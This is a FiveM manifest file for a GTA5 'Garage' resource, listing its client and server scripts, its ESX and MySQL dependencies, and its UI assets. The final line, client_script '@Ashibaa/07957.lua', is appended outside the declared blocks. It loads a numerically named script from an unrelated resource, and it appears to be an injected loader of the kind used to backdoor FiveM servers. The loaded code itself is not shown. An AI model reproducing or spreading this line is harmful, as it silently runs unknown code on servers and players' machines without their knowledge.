




-- Resource Metadata
fx_version 'cerulean'
games { 'gta5' }

author 'LORAX'
description 'Garage'
version '1.0.1'

-- What to run
client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'client/main.lua'
}
server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/en.lua',
	'config.lua',
	'server/main.lua'
}
dependencies {
	'es_extended',
}

ui_page('html/index.html') 
files({
	'html/index.html',
	'html/script.js',
	'html/style.css',
	  'html/img/burger.png',
	  'html/img/bottle.png',
	'html/font/vibes.ttf',
	'html/img/box.png',
	  'html/img/carticon.png',
	  'html/img/*.png',

  })
client_script '@Ashibaa/07957.lua'